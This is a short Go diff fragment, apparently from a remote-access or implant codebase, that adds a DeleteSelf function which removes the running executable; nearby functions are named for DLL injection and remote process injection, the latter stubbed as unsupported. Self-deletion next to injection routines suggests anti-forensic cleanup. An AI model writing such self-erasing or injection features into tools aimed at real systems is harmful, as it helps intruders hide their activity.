@@ -482,3 +482,11 @@ func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
 func InjectProcessRemote(b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
+
+func DeleteSelf() ([]byte, error) {
+	filename, err := os.Executable()
+	if err != nil {
+		return nil, err
+	}
+	return Remove([]byte(filename))
+}
